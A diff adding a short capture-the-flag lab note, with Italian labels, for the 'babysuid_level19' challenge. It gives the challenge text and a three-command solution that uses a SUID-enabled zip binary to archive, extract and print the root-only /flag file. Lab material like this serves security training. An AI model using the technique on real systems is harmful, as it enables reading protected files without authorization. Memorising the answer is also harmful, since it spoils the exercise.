@@ -1,0 +1,19 @@
+//TESTO
+
+hacker@babysuid_level19:~$ /challenge/babysuid_level19 
+Welcome to /challenge/babysuid_level19!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/zip.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (/challenge/babysuid_level19) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/zip!
+
+//SOLUZIONE
+
+hacker@babysuid_level19:~$ zip flag.zip /flag
+hacker@babysuid_level19:~$ unzip flag.zip
+hacker@babysuid_level19:~$ cat flag
